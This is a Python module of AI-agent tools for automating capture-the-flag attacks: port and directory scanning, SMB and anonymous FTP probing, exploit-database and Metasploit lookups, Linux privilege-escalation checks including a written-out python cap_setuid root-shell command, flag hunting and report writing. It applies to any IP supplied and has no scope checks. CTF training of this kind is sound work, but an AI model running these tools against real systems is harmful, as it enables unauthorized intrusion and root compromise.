"""
CTF Automation Tools - Automated CTF Challenge Workflow

This module provides automated reconnaissance, exploitation, privilege escalation,
and flag hunting capabilities optimized for TryHackMe and other CTF platforms.

Primary Users:
- CTF Master (Alpha-Crimson): Full CTF workflow orchestration
- Pentest Agent (Alpha-Red): Automated exploitation
- Vuln Hunter (Alpha-Gold): Reconnaissance and enumeration

Functions:
- auto_enumerate_target(): Automated reconnaissance (nmap + gobuster + services)
- search_exploits(): Multi-source exploit database lookup
- auto_privilege_escalation(): Orchestrated privilege escalation workflow
- hunt_flags(): Automated flag discovery and extraction
- generate_ctf_report(): Comprehensive CTF walkthrough report generation
"""

import json
import os
import re
import shlex
import subprocess
from datetime import datetime
from typing import Any, Optional

from kryon.sdk.agents import function_tool


@function_tool(strict_mode=False)
def auto_enumerate_target(
    ip: str,
    quick_mode: bool = False,
    web_ports: Optional[list[int]] = None,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
) -> dict[str, Any]:
    """
    Automated target enumeration for CTF challenges.

    Performs comprehensive reconnaissance including:
    - Nmap port scanning (all ports or quick scan)
    - Service version detection
    - Gobuster directory brute forcing on web services
    - Automated service-specific enumeration (SMB, FTP, SSH, etc.)

    Args:
        ip: Target IP address (typically 10.10.x.x for TryHackMe)
        quick_mode: If True, only scan common ports (faster)
        web_ports: Custom list of web ports to scan with gobuster
        wordlist: Wordlist path for directory brute forcing

    Returns:
        Dictionary containing:
        - open_ports: List of open ports with services
        - web_services: Web service URLs found
        - gobuster_results: Directory enumeration findings
        - interesting_services: SMB, FTP, SSH, etc. with details
        - recommendations: Suggested next steps

    Example:
        >>> # TryHackMe basic enumeration
        >>> results = auto_enumerate_target("10.10.245.67")
        >>> print(f"Found {len(results['open_ports'])} open ports")
        >>> for port in results['open_ports']:
        ...     print(f"{port['port']}/{port['protocol']}: {port['service']}")

        >>> # Quick scan for time-limited CTFs
        >>> results = auto_enumerate_target("10.10.245.67", quick_mode=True)

        >>> # Custom web ports and wordlist
        >>> results = auto_enumerate_target(
        ...     "10.10.245.67",
        ...     web_ports=[80, 8080, 8443],
        ...     wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
        ... )
    """
    results = {
        "target": ip,
        "scan_time": datetime.now().isoformat(),
        "open_ports": [],
        "web_services": [],
        "gobuster_results": {},
        "interesting_services": {},
        "recommendations": [],
    }

    # Phase 1: Nmap port scanning
    print(f"[*] Starting nmap scan on {ip}...")

    if quick_mode:
        # Quick scan: top 1000 ports
        nmap_cmd = f"nmap -sV -sC -T4 {shlex.quote(ip)} -oN /tmp/nmap_{ip.replace('.', '_')}.txt"
    else:
        # Full scan: all ports
        nmap_cmd = f"nmap -p- -sV -sC -T4 {shlex.quote(ip)} -oN /tmp/nmap_{ip.replace('.', '_')}.txt"

    try:
        nmap_output = subprocess.run(
            nmap_cmd,
            shell=True,  # nosemgrep: subprocess-shell-true
            capture_output=True,
            text=True,
            timeout=1800,  # 30 min timeout for full scan
        )

        # Parse nmap output
        for line in nmap_output.stdout.split("\n"):
            # Match: 22/tcp   open  ssh     OpenSSH 7.6p1
            port_match = re.match(r"(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)", line)
            if port_match:
                port_info = {
                    "port": int(port_match.group(1)),
                    "protocol": port_match.group(2),
                    "service": port_match.group(3),
                    "version": port_match.group(4).strip(),
                }
                results["open_ports"].append(port_info)

                # Identify web services
                if port_info["service"] in ["http", "https", "ssl/http"]:
                    protocol = "https" if "ssl" in port_info["service"] or port_info["port"] == 443 else "http"
                    url = f"{protocol}://{ip}:{port_info['port']}"
                    results["web_services"].append(url)

                # Track interesting services
                if port_info["service"] in ["ssh", "ftp", "smb", "mysql", "rdp", "vnc"]:
                    results["interesting_services"][port_info["service"]] = port_info

        print(f"[+] Found {len(results['open_ports'])} open ports")

    except subprocess.TimeoutExpired:
        results["error"] = "Nmap scan timed out"
        return results
    except Exception as e:
        results["error"] = f"Nmap scan failed: {str(e)}"
        return results

    # Phase 2: Gobuster directory enumeration on web services
    if results["web_services"]:
        print(f"[*] Running gobuster on {len(results['web_services'])} web service(s)...")

        if web_ports is None:
            # Use discovered web ports
            web_targets = results["web_services"]
        else:
            # Use specified ports
            web_targets = []
            for port in web_ports:
                protocol = "https" if port == 443 else "http"
                web_targets.append(f"{protocol}://{ip}:{port}")

        for url in web_targets:
            try:
                gobuster_cmd = f"gobuster dir -u {shlex.quote(url)} -w {shlex.quote(wordlist)} -t 50 -q -o /tmp/gobuster_{url.replace('://', '_').replace(':', '_')}.txt"

                gobuster_output = subprocess.run(
                    gobuster_cmd,
                    shell=True,  # nosemgrep: subprocess-shell-true
                    capture_output=True,
                    text=True,
                    timeout=600,  # 10 min timeout
                )

                # Parse gobuster output
                directories = []
                for line in gobuster_output.stdout.split("\n"):
                    # Match: /admin (Status: 200) [Size: 1234]
                    dir_match = re.match(r"(/\S+)\s+\(Status:\s+(\d+)\)", line)
                    if dir_match:
                        directories.append({"path": dir_match.group(1), "status": int(dir_match.group(2))})

                results["gobuster_results"][url] = directories
                print(f"[+] Found {len(directories)} directories on {url}")

            except subprocess.TimeoutExpired:
                results["gobuster_results"][url] = {"error": "Timeout"}
            except Exception as e:
                results["gobuster_results"][url] = {"error": str(e)}

    # Phase 3: Service-specific enumeration

    # SMB enumeration
    if "smb" in results["interesting_services"] or any(p["port"] in [139, 445] for p in results["open_ports"]):
        print("[*] Enumerating SMB shares...")
        try:
            smbclient_cmd = f"smbclient -L //{shlex.quote(ip)} -N"
            smb_output = subprocess.run(
                # nosemgrep: subprocess-shell-true
                smbclient_cmd,
                # nosemgrep: subprocess-shell-true
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
            )  # nosemgrep: subprocess-shell-true
            results["interesting_services"]["smb_shares"] = smb_output.stdout
            results["recommendations"].append("Check SMB shares for sensitive files")
        except Exception as e:
            results["interesting_services"]["smb_error"] = str(e)

    # FTP enumeration
    if "ftp" in results["interesting_services"]:
        print("[*] Checking FTP anonymous login...")
        try:
            ftp_cmd = f"ftp -n {shlex.quote(ip)} <<EOF\nuser anonymous anonymous\nls\nquit\nEOF"
            ftp_output = subprocess.run(
                # nosemgrep: subprocess-shell-true
                ftp_cmd,
                # nosemgrep: subprocess-shell-true
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
            )  # nosemgrep: subprocess-shell-true
            if "230" in ftp_output.stdout:  # Login successful
                results["interesting_services"]["ftp_anonymous"] = True
                results["recommendations"].append("FTP allows anonymous login - explore files")
        except Exception:
            pass

    # Generate recommendations
    if results["web_services"]:
        results["recommendations"].append("Check web services for common vulnerabilities (SQLi, LFI, RFI)")

    if "ssh" in results["interesting_services"]:
        results["recommendations"].append("Try SSH brute force or check for default credentials")

    if len(results["open_ports"]) > 10:
        results["recommendations"].append("Many ports open - focus on unusual services first")

    return results


@function_tool(strict_mode=False)
def search_exploits(
    service: str,
    version: Optional[str] = None,
    platform: Optional[str] = None,
    search_metasploit: bool = True,
) -> dict[str, Any]:
    """
    Search multiple exploit databases for known vulnerabilities.

    Queries:
    - SearchSploit (local ExploitDB mirror)
    - Metasploit Framework (if enabled)
    - CVE pattern matching in version strings

    Args:
        service: Service name (e.g., "apache", "openssh", "vsftpd")
        version: Service version (e.g., "2.3.4", "7.6p1")
        platform: Target platform ("linux", "windows", "unix", etc.)
        search_metasploit: Include Metasploit module search

    Returns:
        Dictionary containing:
        - searchsploit_results: ExploitDB findings
        - metasploit_modules: Available MSF modules
        - cve_references: Detected CVE numbers
        - recommendations: Suggested exploit paths

    Example:
        >>> # Search for vsftpd backdoor
        >>> exploits = search_exploits("vsftpd", "2.3.4")
        >>> for exploit in exploits['searchsploit_results']:
        ...     print(f"{exploit['title']} - {exploit['path']}")

        >>> # Search for OpenSSH vulnerabilities
        >>> exploits = search_exploits("openssh", "7.6p1", platform="linux")

        >>> # Apache Struts RCE
        >>> exploits = search_exploits("apache struts", "2.5.12")
        >>> if exploits['metasploit_modules']:
        ...     print(f"Use Metasploit: {exploits['metasploit_modules'][0]['name']}")
    """
    results = {
        "query": f"{service} {version or ''}".strip(),
        "searchsploit_results": [],
        "metasploit_modules": [],
        "cve_references": [],
        "recommendations": [],
    }

    # Phase 1: SearchSploit (ExploitDB)
    print(f"[*] Searching ExploitDB for {results['query']}...")

    searchsploit_cmd = ["searchsploit", "-j", service]
    if version:
        searchsploit_cmd.append(version)

    try:
        searchsploit_output = subprocess.run(searchsploit_cmd, capture_output=True, text=True, timeout=30)

        # Parse JSON output
        try:
            exploits_data = json.loads(searchsploit_output.stdout)
            if "RESULTS_EXPLOIT" in exploits_data:
                for exploit in exploits_data["RESULTS_EXPLOIT"]:
                    results["searchsploit_results"].append(
                        {
                            "title": exploit.get("Title", ""),
                            "path": exploit.get("Path", ""),
                            "date": exploit.get("Date", ""),
                            "platform": exploit.get("Platform", ""),
                        }
                    )

                    # Extract CVE references
                    cve_match = re.findall(r"CVE-\d{4}-\d+", exploit.get("Title", ""))
                    results["cve_references"].extend(cve_match)

                print(f"[+] Found {len(results['searchsploit_results'])} exploits in ExploitDB")
        except json.JSONDecodeError:
            # Fallback to text parsing
            for line in searchsploit_output.stdout.split("\n"):
                if "|" in line and "Exploit Title" not in line:
                    parts = line.split("|")
                    if len(parts) >= 2:
                        results["searchsploit_results"].append({"title": parts[0].strip(), "path": parts[1].strip()})

    except FileNotFoundError:
        results["searchsploit_error"] = "searchsploit not installed"
    except Exception as e:
        results["searchsploit_error"] = str(e)

    # Phase 2: Metasploit Framework search
    if search_metasploit:
        print("[*] Searching Metasploit modules...")

        try:
            # Use msfconsole to search modules
            msf_search_query = f"{service} {version or ''}".strip()
            msf_cmd = f"msfconsole -q -x 'search {msf_search_query}; exit' 2>/dev/null"

            msf_output = subprocess.run(
                # nosemgrep: subprocess-shell-true
                msf_cmd,
                # nosemgrep: subprocess-shell-true
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
            )  # nosemgrep: subprocess-shell-true

            # Parse MSF output
            for line in msf_output.stdout.split("\n"):
                # Match: exploit/unix/ftp/vsftpd_234_backdoor
                if "exploit/" in line or "auxiliary/" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        results["metasploit_modules"].append(
                            {
                                "name": parts[0].strip(),
                                "rank": parts[1].strip() if len(parts) > 1 else "unknown",
                            }
                        )

            print(f"[+] Found {len(results['metasploit_modules'])} Metasploit modules")

        except FileNotFoundError:
            results["metasploit_error"] = "Metasploit not installed"
        except Exception as e:
            results["metasploit_error"] = str(e)

    # Phase 3: Generate recommendations
    if results["searchsploit_results"]:
        results["recommendations"].append(f"Copy exploit: searchsploit -m {results['searchsploit_results'][0]['path']}")

    if results["metasploit_modules"]:
        results["recommendations"].append(f"Use Metasploit: use {results['metasploit_modules'][0]['name']}")

    if results["cve_references"]:
        results["recommendations"].append(f"Research CVEs: {', '.join(set(results['cve_references'][:3]))}")

    if not results["searchsploit_results"] and not results["metasploit_modules"]:
        results["recommendations"].append("No public exploits found - try manual exploitation")

    # Remove duplicates from CVE references
    results["cve_references"] = list(set(results["cve_references"]))

    return results


def auto_privilege_escalation(
    run_linpeas: bool = True,
    check_sudo: bool = True,
    check_suid: bool = True,
    check_capabilities: bool = True,
    timeout_minutes: int = 15,
) -> dict[str, Any]:
    """
    Automated privilege escalation workflow for Linux systems.

    Orchestrates multiple privilege escalation checks:
    - LinPEAS comprehensive scanner
    - Sudo misconfiguration checks with GTFOBins lookup
    - SUID binary analysis
    - Linux capabilities enumeration
    - Automated exploit suggestion

    Args:
        run_linpeas: Execute LinPEAS scanner
        check_sudo: Check sudo permissions
        check_suid: Find and analyze SUID binaries
        check_capabilities: Check for exploitable capabilities
        timeout_minutes: Maximum execution time

    Returns:
        Dictionary containing:
        - linpeas_findings: Critical LinPEAS discoveries
        - sudo_exploits: Exploitable sudo permissions
        - suid_exploits: Exploitable SUID binaries
        - capabilities: Interesting capabilities
        - quick_wins: Immediately exploitable paths
        - recommendations: Prioritized next steps

    Example:
        >>> # Full automated privesc
        >>> privesc = auto_privilege_escalation()
        >>> if privesc['quick_wins']:
        ...     print(f"[!] Quick win found: {privesc['quick_wins'][0]['command']}")

        >>> # Quick scan (skip LinPEAS for speed)
        >>> privesc = auto_privilege_escalation(run_linpeas=False, timeout_minutes=5)

        >>> # Sudo-focused scan
        >>> privesc = auto_privilege_escalation(
        ...     run_linpeas=False,
        ...     check_sudo=True,
        ...     check_suid=False
        ... )
    """
    from kryon.tools.privilege_escalation.linux_privesc import (
        check_sudo_exploits,
        find_suid_exploitable,
        run_linpeas as execute_linpeas,
    )

    results = {
        "timestamp": datetime.now().isoformat(),
        "linpeas_findings": {},
        "sudo_exploits": [],
        "suid_exploits": [],
        "capabilities": [],
        "quick_wins": [],
        "recommendations": [],
    }

    timeout_minutes * 60

    # Phase 1: LinPEAS scan
    if run_linpeas:
        print("[*] Running LinPEAS comprehensive scan...")
        try:
            linpeas_result = execute_linpeas(thorough=False)
            results["linpeas_findings"] = linpeas_result

            # Extract quick wins from LinPEAS
            if linpeas_result.get("critical_findings"):
                for finding in linpeas_result["critical_findings"][:3]:
                    results["quick_wins"].append({"source": "linpeas", "type": "critical", "description": finding})

            print(f"[+] LinPEAS found {len(linpeas_result.get('critical_findings', []))} critical findings")

        except Exception as e:
            results["linpeas_error"] = str(e)
            print(f"[-] LinPEAS failed: {e}")

    # Phase 2: Sudo exploit check
    if check_sudo:
        print("[*] Checking sudo permissions and GTFOBins...")
        try:
            sudo_result = check_sudo_exploits()

            if sudo_result.get("exploitable"):
                results["sudo_exploits"] = sudo_result["exploitable"]

                # First sudo exploit is a quick win
                if sudo_result["exploitable"]:
                    results["quick_wins"].append(
                        {
                            "source": "sudo",
                            "type": "sudo_exploit",
                            "binary": sudo_result["exploitable"][0]["binary"],
                            "command": sudo_result["exploitable"][0]["command"],
                            "description": f"Sudo {sudo_result['exploitable'][0]['binary']} exploit",
                        }
                    )

                print(f"[+] Found {len(sudo_result['exploitable'])} exploitable sudo permissions")

        except Exception as e:
            results["sudo_error"] = str(e)
            print(f"[-] Sudo check failed: {e}")

    # Phase 3: SUID binary analysis
    if check_suid:
        print("[*] Analyzing SUID binaries...")
        try:
            suid_result = find_suid_exploitable()

            if suid_result.get("exploitable"):
                results["suid_exploits"] = suid_result["exploitable"]

                # First SUID exploit is a quick win
                if suid_result["exploitable"]:
                    results["quick_wins"].append(
                        {
                            "source": "suid",
                            "type": "suid_exploit",
                            "binary": suid_result["exploitable"][0]["binary"],
                            "command": suid_result["exploitable"][0]["command"],
                            "description": f"SUID {suid_result['exploitable'][0]['binary']} exploit",
                        }
                    )

                print(f"[+] Found {len(suid_result['exploitable'])} exploitable SUID binaries")

        except Exception as e:
            results["suid_error"] = str(e)
            print(f"[-] SUID check failed: {e}")

    # Phase 4: Capabilities check
    if check_capabilities:
        print("[*] Checking Linux capabilities...")
        try:
            getcap_cmd = "getcap -r / 2>/dev/null"
            cap_output = subprocess.run(getcap_cmd, shell=True, capture_output=True, text=True, timeout=120)

            interesting_caps = [
                "cap_setuid",
                "cap_setgid",
                "cap_dac_override",
                "cap_dac_read_search",
            ]

            for line in cap_output.stdout.split("\n"):
                for cap in interesting_caps:
                    if cap in line:
                        results["capabilities"].append(line.strip())

                        # Python with cap_setuid is a quick win
                        if "python" in line and "cap_setuid" in line:
                            python_path = line.split()[0]
                            results["quick_wins"].append(
                                {
                                    "source": "capabilities",
                                    "type": "cap_setuid",
                                    "binary": python_path,
                                    "command": f"{python_path} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                                    "description": "Python with cap_setuid capability",
                                }
                            )

            print(f"[+] Found {len(results['capabilities'])} interesting capabilities")

        except Exception as e:
            results["capabilities_error"] = str(e)

    # Phase 5: Generate prioritized recommendations
    if results["quick_wins"]:
        results["recommendations"].append(f"[PRIORITY] Quick win available: {results['quick_wins'][0]['description']}")
        results["recommendations"].append(f"Execute: {results['quick_wins'][0]['command']}")

    if results["sudo_exploits"]:
        results["recommendations"].append(f"Try sudo exploit: {results['sudo_exploits'][0]['command']}")

    if results["suid_exploits"]:
        results["recommendations"].append(f"Try SUID exploit: {results['suid_exploits'][0]['command']}")

    if not results["quick_wins"]:
        results["recommendations"].append("No quick wins found - check LinPEAS output for manual exploitation")
        results["recommendations"].append("Try kernel exploits: uname -a && searchsploit kernel")

    return results


@function_tool(strict_mode=False)
def hunt_flags(
    search_paths: Optional[list[str]] = None,
    flag_patterns: Optional[list[str]] = None,
    check_common_locations: bool = True,
    search_files: bool = True,
) -> dict[str, Any]:
    r"""
    Automated flag hunting for CTF challenges.

    Searches for:
    - user.txt and root.txt (TryHackMe/HackTheBox standard)
    - Custom flag patterns (THM{...}, HTB{...}, FLAG{...}, etc.)
    - Common flag locations (/home/*, /root, /opt, etc.)
    - Files containing flag patterns

    Args:
        search_paths: Custom paths to search (default: /, /home, /root, /opt)
        flag_patterns: Custom regex patterns for flags
        check_common_locations: Search standard CTF flag locations
        search_files: Search file contents for flag patterns

    Returns:
        Dictionary containing:
        - flags_found: List of discovered flags with locations
        - user_flag: user.txt content if found
        - root_flag: root.txt content if found
        - interesting_files: Files matching flag patterns
        - recommendations: Next steps for flag hunting

    Example:
        >>> # Standard TryHackMe flag hunt
        >>> flags = hunt_flags()
        >>> if flags['user_flag']:
        ...     print(f"User flag: {flags['user_flag']['content']}")
        >>> if flags['root_flag']:
        ...     print(f"Root flag: {flags['root_flag']['content']}")

        >>> # Custom flag pattern (e.g., COMPANY{...})
        >>> flags = hunt_flags(flag_patterns=[r'COMPANY\{[^}]+\}'])  # noqa: W605

        >>> # Search only /var/www for web flags
        >>> flags = hunt_flags(
        ...     search_paths=["/var/www"],
        ...     check_common_locations=False
        ... )
    """
    results = {
        "timestamp": datetime.now().isoformat(),
        "flags_found": [],
        "user_flag": None,
        "root_flag": None,
        "interesting_files": [],
        "recommendations": [],
    }

    # Default search paths
    if search_paths is None:
        search_paths = ["/home", "/root", "/opt", "/var/www", "/tmp"]

    # Default flag patterns
    if flag_patterns is None:
        flag_patterns = [
            r"THM\{[^}]+\}",  # TryHackMe
            r"HTB\{[^}]+\}",  # HackTheBox
            r"FLAG\{[^}]+\}",  # Generic FLAG
            r"flag\{[^}]+\}",  # Generic flag
            r"CTF\{[^}]+\}",  # Generic CTF
            r"[a-f0-9]{32}",  # MD5 hash (common flag format)
        ]

    # Phase 1: Check standard locations (user.txt, root.txt)
    if check_common_locations:
        print("[*] Checking standard flag locations...")

        standard_locations = [
            "/root/root.txt",
            "/home/*/user.txt",
            "/root/flag.txt",
            "/home/*/flag.txt",
        ]

        for location in standard_locations:
            try:
                # Handle wildcards
                if "*" in location:
                    find_cmd = f"find {shlex.quote(os.path.dirname(location))} -name {shlex.quote(os.path.basename(location))} 2>/dev/null"
                    find_output = subprocess.run(
                        # nosemgrep: subprocess-shell-true
                        find_cmd,
                        # nosemgrep: subprocess-shell-true
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30,
                    )  # nosemgrep: subprocess-shell-true

                    for file_path in find_output.stdout.strip().split("\n"):
                        if file_path:
                            cat_cmd = f"cat {shlex.quote(file_path)} 2>/dev/null"
                            cat_output = subprocess.run(
                                # nosemgrep: subprocess-shell-true
                                cat_cmd,
                                # nosemgrep: subprocess-shell-true
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=10,
                            )  # nosemgrep: subprocess-shell-true

                            if cat_output.stdout.strip():
                                flag_data = {
                                    "location": file_path,
                                    "content": cat_output.stdout.strip(),
                                }
                                results["flags_found"].append(flag_data)

                                # Categorize as user or root flag
                                if "user.txt" in file_path:
                                    results["user_flag"] = flag_data
                                    print(f"[+] Found user flag: {file_path}")
                                elif "root.txt" in file_path:
                                    results["root_flag"] = flag_data
                                    print(f"[+] Found root flag: {file_path}")
                else:
                    # Direct file check
                    if os.path.isfile(location):
                        with open(location) as f:
                            content = f.read().strip()
                            flag_data = {"location": location, "content": content}
                            results["flags_found"].append(flag_data)

                            if "user.txt" in location:
                                results["user_flag"] = flag_data
                                print(f"[+] Found user flag: {location}")
                            elif "root.txt" in location:
                                results["root_flag"] = flag_data
                                print(f"[+] Found root flag: {location}")

            except Exception:
                continue

    # Phase 2: Search for files matching flag patterns
    if search_files:
        print("[*] Searching files for flag patterns...")

        for path in search_paths:
            for pattern in flag_patterns:
                try:
                    # Use grep to search files
                    grep_cmd = f"grep -r -E {shlex.quote(pattern)} {shlex.quote(path)} 2>/dev/null | head -20"
                    grep_output = subprocess.run(
                        # nosemgrep: subprocess-shell-true
                        grep_cmd,
                        # nosemgrep: subprocess-shell-true
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=120,
                    )  # nosemgrep: subprocess-shell-true

                    for line in grep_output.stdout.split("\n"):
                        if ":" in line:
                            file_path, content = line.split(":", 1)

                            # Extract actual flag from content
                            flag_match = re.search(pattern, content)
                            if flag_match:
                                flag_data = {
                                    "location": file_path.strip(),
                                    "content": flag_match.group(0),
                                    "pattern": pattern,
                                    "context": content.strip(),
                                }

                                # Avoid duplicates
                                if not any(f["content"] == flag_data["content"] for f in results["flags_found"]):
                                    results["flags_found"].append(flag_data)
                                    results["interesting_files"].append(file_path.strip())
                                    print(f"[+] Found flag pattern in: {file_path}")

                except subprocess.TimeoutExpired:
                    print(f"[-] Search timed out in {path}")
                except Exception:
                    continue

    # Phase 3: Generate recommendations
    if results["user_flag"] and not results["root_flag"]:
        results["recommendations"].append("User flag found - escalate privileges to get root flag")
        results["recommendations"].append("Run: auto_privilege_escalation()")

    if results["root_flag"] and not results["user_flag"]:
        results["recommendations"].append("Root flag found but no user flag - check /home directories")

    if not results["flags_found"]:
        results["recommendations"].append("No flags found - try these locations:")
        results["recommendations"].append("  - /var/www/html (web root)")
        results["recommendations"].append("  - /opt (custom applications)")
        results["recommendations"].append("  - ~/.bash_history (command history)")
        results["recommendations"].append("  - Database files (MySQL, SQLite)")

    if results["interesting_files"]:
        results["recommendations"].append(f"Check {len(results['interesting_files'])} interesting files for more flags")

    return results


def generate_ctf_report(
    target_ip: str,
    enumeration_results: Optional[dict] = None,
    exploit_info: Optional[dict] = None,
    privesc_info: Optional[dict] = None,
    flags_found: Optional[dict] = None,
    output_file: str = "/tmp/ctf_report.md",
) -> dict[str, Any]:
    """
    Generate comprehensive CTF walkthrough report in Markdown format.

    Creates a professional report documenting:
    - Target information and initial reconnaissance
    - Enumeration findings and service analysis
    - Exploitation steps and commands used
    - Privilege escalation methodology
    - Flags captured and their locations
    - Complete command timeline

    Args:
        target_ip: Target machine IP address
        enumeration_results: Output from auto_enumerate_target()
        exploit_info: Exploitation details and commands
        privesc_info: Output from auto_privilege_escalation()
        flags_found: Output from hunt_flags()
        output_file: Path to save report (default: /tmp/ctf_report.md)

    Returns:
        Dictionary containing:
        - report_path: Path to generated report
        - sections: Number of sections generated
        - word_count: Total words in report
        - commands_documented: Number of commands included

    Example:
        >>> # Complete CTF workflow with report
        >>> enum = auto_enumerate_target("10.10.245.67")
        >>> exploits = search_exploits("vsftpd", "2.3.4")
        >>> privesc = auto_privilege_escalation()
        >>> flags = hunt_flags()
        >>>
        >>> report = generate_ctf_report(
        ...     target_ip="10.10.245.67",
        ...     enumeration_results=enum,
        ...     exploit_info=exploits,
        ...     privesc_info=privesc,
        ...     flags_found=flags,
        ...     output_file="/home/user/reports/thm_machine.md"
        ... )
        >>> print(f"Report saved to: {report['report_path']}")
    """
    report_lines = []
    commands_used = []

    # Header
    report_lines.append(f"# CTF Walkthrough - {target_ip}")
    report_lines.append(f"\n**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    report_lines.append(f"**Target:** {target_ip}")
    report_lines.append("\n---\n")

    # Section 1: Enumeration
    if enumeration_results:
        report_lines.append("## 1. Enumeration\n")
        report_lines.append("### Initial Reconnaissance\n")

        # Nmap scan
        if enumeration_results.get("open_ports"):
            report_lines.append("**Open Ports:**\n")
            for port in enumeration_results["open_ports"]:
                report_lines.append(f"- {port['port']}/{port['protocol']}: {port['service']} {port.get('version', '')}")

            report_lines.append("\n**Command:**")
            report_lines.append("```bash")
            report_lines.append(f"nmap -sV -sC -T4 {target_ip}")
            report_lines.append("```\n")
            commands_used.append(f"nmap -sV -sC -T4 {target_ip}")

        # Web enumeration
        if enumeration_results.get("gobuster_results"):
            report_lines.append("### Web Enumeration\n")
            for url, dirs in enumeration_results["gobuster_results"].items():
                if isinstance(dirs, list) and dirs:
                    report_lines.append(f"**Discovered directories on {url}:**\n")
                    for dir_info in dirs[:10]:  # Top 10
                        report_lines.append(f"- {dir_info['path']} (Status: {dir_info['status']})")

                    report_lines.append("\n**Command:**")
                    report_lines.append("```bash")
                    report_lines.append(f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt")
                    report_lines.append("```\n")
                    commands_used.append(f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt")

        # Interesting services
        if enumeration_results.get("interesting_services"):
            report_lines.append("### Interesting Services\n")
            for service, details in enumeration_results["interesting_services"].items():
                if isinstance(details, dict):
                    report_lines.append(f"- **{service.upper()}:** {details.get('version', 'No version info')}")

    # Section 2: Exploitation
    if exploit_info:
        report_lines.append("\n## 2. Exploitation\n")

        if exploit_info.get("searchsploit_results"):
            report_lines.append("### Available Exploits\n")
            for exploit in exploit_info["searchsploit_results"][:5]:
                report_lines.append(f"- {exploit['title']}")

            if exploit_info["searchsploit_results"]:
                report_lines.append("\n**Command:**")
                report_lines.append("```bash")
                report_lines.append(f"searchsploit {exploit_info.get('query', '')}")
                report_lines.append("```\n")
                commands_used.append(f"searchsploit {exploit_info.get('query', '')}")

        if exploit_info.get("metasploit_modules"):
            report_lines.append("### Metasploit Modules\n")
            for module in exploit_info["metasploit_modules"][:3]:
                report_lines.append(f"- {module['name']}")

    # Section 3: Privilege Escalation
    if privesc_info:
        report_lines.append("\n## 3. Privilege Escalation\n")

        # Quick wins
        if privesc_info.get("quick_wins"):
            report_lines.append("### Quick Wins Found\n")
            for win in privesc_info["quick_wins"]:
                report_lines.append(f"**{win['description']}**\n")
                report_lines.append("```bash")
                report_lines.append(win["command"])
                report_lines.append("```\n")
                commands_used.append(win["command"])

        # Sudo exploits
        if privesc_info.get("sudo_exploits"):
            report_lines.append("### Sudo Exploits\n")
            for exploit in privesc_info["sudo_exploits"][:3]:
                report_lines.append(f"- **{exploit['binary']}:** {exploit['technique']}")
                report_lines.append(f"  ```bash\n  {exploit['command']}\n  ```")
                commands_used.append(exploit["command"])

        # SUID exploits
        if privesc_info.get("suid_exploits"):
            report_lines.append("\n### SUID Exploits\n")
            for exploit in privesc_info["suid_exploits"][:3]:
                report_lines.append(f"- **{exploit['binary']}:** {exploit['technique']}")
                report_lines.append(f"  ```bash\n  {exploit['command']}\n  ```")
                commands_used.append(exploit["command"])

    # Section 4: Flags
    if flags_found:
        report_lines.append("\n## 4. Flags Captured\n")

        if flags_found.get("user_flag"):
            report_lines.append("### User Flag\n")
            report_lines.append(f"**Location:** `{flags_found['user_flag']['location']}`")
            report_lines.append(f"```\n{flags_found['user_flag']['content']}\n```\n")

        if flags_found.get("root_flag"):
            report_lines.append("### Root Flag\n")
            report_lines.append(f"**Location:** `{flags_found['root_flag']['location']}`")
            report_lines.append(f"```\n{flags_found['root_flag']['content']}\n```\n")

        # Other flags
        other_flags = [
            f
            for f in flags_found.get("flags_found", [])
            if f != flags_found.get("user_flag") and f != flags_found.get("root_flag")
        ]
        if other_flags:
            report_lines.append("### Additional Flags\n")
            for flag in other_flags:
                report_lines.append(f"- **{flag['location']}:** `{flag['content']}`")

    # Section 5: Commands Summary
    if commands_used:
        report_lines.append("\n## 5. Command Summary\n")
        report_lines.append("Complete list of commands used:\n")
        report_lines.append("```bash")
        for cmd in commands_used:
            report_lines.append(cmd)
        report_lines.append("```\n")

    # Footer
    report_lines.append("\n---\n")
    report_lines.append("*Report generated by KRYON CTF Master*")

    # Write report to file
    report_content = "\n".join(report_lines)

    try:
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        with open(output_file, "w") as f:
            f.write(report_content)

        # Calculate statistics
        word_count = len(report_content.split())
        section_count = report_content.count("##")

        print(f"[+] Report generated: {output_file}")
        print(f"    Sections: {section_count}, Words: {word_count}, Commands: {len(commands_used)}")

        return {
            "success": True,
            "report_path": output_file,
            "sections": section_count,
            "word_count": word_count,
            "commands_documented": len(commands_used),
        }

    except Exception as e:
        return {"success": False, "error": str(e)}
